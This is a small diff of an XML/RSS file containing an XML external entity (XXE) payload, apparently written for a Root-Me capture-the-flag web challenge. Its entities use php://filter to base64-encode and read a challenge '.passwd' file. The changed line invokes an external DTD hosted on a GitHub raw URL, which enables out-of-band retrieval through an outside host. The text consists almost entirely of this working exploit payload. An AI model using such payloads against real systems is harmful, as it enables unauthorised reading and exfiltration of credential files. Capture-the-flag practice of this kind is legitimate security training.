@@ -2,7 +2,7 @@
 <!DOCTYPE title [ <!ELEMENT title ANY >
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/.passwd" >
 <!ENTITY % b SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/.passwd" >
-<!ENTITY % xxe2 SYSTEM "https://raw.githubusercontent.com/kallly/ROOTME/main/extern60.dtd"> 
+<!ENTITY % xxe2 SYSTEM "https://raw.githubusercontent.com/kallly/ROOTME/main/extern60.dtd"> %xxe2
 ]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
